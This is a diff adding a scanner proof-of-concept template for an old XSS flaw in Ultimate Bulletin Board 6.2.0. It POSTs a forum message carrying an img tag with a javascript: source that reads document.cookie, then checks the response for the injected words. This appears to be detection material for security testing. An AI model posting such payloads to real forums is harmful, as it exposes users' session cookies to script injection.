@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "检测 Infopop Ultimate Bulletin Board (UBB) 6.2.0 中 IMG 标签 javascript: 协议 XSS 漏洞"
+id = "POC-AVE-2002-0173"
+name = "CVE-2002-0118 UBB XSS Cross-Agent Scripting PoC"
+severity = "high"
+tags = [
+    "cve-2002-0118",
+    "ubb",
+    "xss",
+]
+vuln_id = [
+    "CVE-2002-0118",
+    "AVE-2002-0173",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/ubb/ultimatebb.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "ubb=posting&topic=&forum=0&subject=PoC+Test&message=%3Cimg+src%3D%22javascript%3Aalert%28document.cookie%29%22%3E"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "img src",
+    "javascript",
+    "alert",
+]
